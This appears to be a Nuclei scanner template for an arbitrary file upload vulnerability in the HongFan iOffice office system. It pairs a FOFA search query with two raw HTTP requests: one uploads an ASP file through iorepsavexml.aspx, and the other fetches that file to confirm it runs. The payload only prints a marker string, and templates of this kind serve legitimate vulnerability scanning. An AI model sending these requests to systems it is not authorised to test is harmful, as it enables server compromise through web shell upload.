id: HFOffice-iorepsavexml-fileupload

info:
  name: 红帆-ioffice-iorepsavexml-文件上传
  author: HuanXiong
  severity: high
  metadata:
    fofa-query: body="./config/pc-app-config.js" && title="HFOffice" || app="红帆-ioffice"

  tags: File Upload

http:
  - raw:
      - |
        POST /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=1.asp&filepath=/upfiles/rep/pic/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Length: 6

        <% response.write("drwc2nymcirgr7r2bdgb")%>
      - |
        GET /iOffice/upfiles/rep/pic/1.asp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close

              
    matchers:
      - type: dsl
        dsl:
          - "contains_all(body_2,'drwc2nymcirgr7r2bdgb')"
